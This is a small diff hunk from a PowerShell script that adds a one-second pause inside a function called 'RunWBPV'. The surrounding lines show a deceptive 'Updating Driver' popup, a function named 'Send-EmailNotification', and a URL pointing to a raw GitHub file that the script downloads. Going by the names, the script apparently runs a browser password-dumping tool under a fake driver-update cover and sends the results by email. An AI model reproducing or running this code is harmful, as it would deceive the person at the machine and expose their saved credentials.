@@ -86,6 +86,7 @@ function Send-EmailNotification {
 }
 function RunWBPV {
         $done = New-Object -ComObject Wscript.Shell;$done.Popup("Updating Driver",1)
+        Start-Sleep -Seconds 1
     
         # Run WBPV 
         $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
